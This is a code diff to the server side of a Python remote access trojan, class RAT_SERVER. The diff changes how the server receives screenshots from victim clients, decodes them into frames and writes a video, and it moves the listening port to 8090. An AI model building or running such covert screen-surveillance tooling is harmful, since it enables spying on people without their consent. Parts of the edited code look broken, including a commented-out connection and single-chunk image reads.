@@ -8,6 +8,10 @@ import datetime
 import cv2
 import io
 import struct
+import numpy as np
+import uuid
+import pickle
+from PIL import Image
 
 
 class SingletonMeta(type):
@@ -119,9 +123,9 @@ class RAT_SERVER(metaclass=SingletonMeta):
     def build_screenshare_connection(self):
         # Start the socket connection
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((self.host, 8080))
+        s.bind((self.host, 8090))
         s.listen(5)
-        self.connection = s.accept()[0].makefile('rb')
+        # self.connection = s.accept()[0].makefile('rb')
         print("[*] Waiting for screenshare clients...")
 
         while True:
@@ -166,24 +170,23 @@ class RAT_SERVER(metaclass=SingletonMeta):
         while True:
             try:
                 # Get the image
-                print("Getting image")
                 img = self.get_screenshot(screenshare_socket)
-                print("Image gotten !")
 
-                # Save this as a image
-                cv2.imwrite(
-                    "temp" + datetime.datetime.now().strftime("%H%M%S") + ".jpg", img)
+                # Turn the image into a frame
+                frame = np.array(Image.open(io.BytesIO(img)))
 
-                if img is not None:
-                    # Add the image to the frames
-                    frames.append(img)
+                # Add the frame to the frames list
+                frames.append(frame)
 
-                    if out is None:
-                        # Get image dimensions from the first image
-                        frame_height, frame_width, _ = img.shape
-                        fourcc = cv2.VideoWriter_fourcc(*'XVID')
-                        out = cv2.VideoWriter(
-                            f"{directory}video.avi", fourcc, 20.0, (frame_width, frame_height))
+                # If the out is None, initialize it
+                if out is None:
+                    # Get the height and width of the frame
+                    height, width, layers = frame.shape
+                    size = (width, height)
+
+                    # Make the video
+                    out = cv2.VideoWriter(
+                        f"{directory}video.avi", cv2.VideoWriter_fourcc(*'DIVX'), 15, size)
 
             except Exception as e:
                 print(f"Error getting image: {str(e)}")
@@ -204,22 +207,20 @@ class RAT_SERVER(metaclass=SingletonMeta):
             break
 
     def get_screenshot(self, client_socket):
-        # Get the image
-        while True:
-            chunk = client_socket.recv(40096)
+        try:
 
-            image_len = struct.unpack(
-                '<L', self.connection.read(struct.calcsize('<L')))[0]
-            if not image_len:
-                break
+            chunk = client_socket.recv(400096)
+            if not chunk:
+                return None
 
-            image_stream = io.BytesIO()
-            image_stream.write(self.connection.read(image_len))
+            # Get the image
+            img = chunk
 
-            image_stream.seek(0)
-            chunk = image_stream.read()
-            # Save the image just for testing purposes
-            # cv2.imwrite("temp" + datetime.datetime.now().strftime("%H%M%S") + ".jpg", chunk)
-            img_data = chunk
+            # Write a example image
+            file = open("image.png", "wb")
+            file.write(img)
+            return img
 
-        return img_data if img_data else None
+        except Exception as e:
+            print(f"Error getting image: {str(e)}")
+        return None
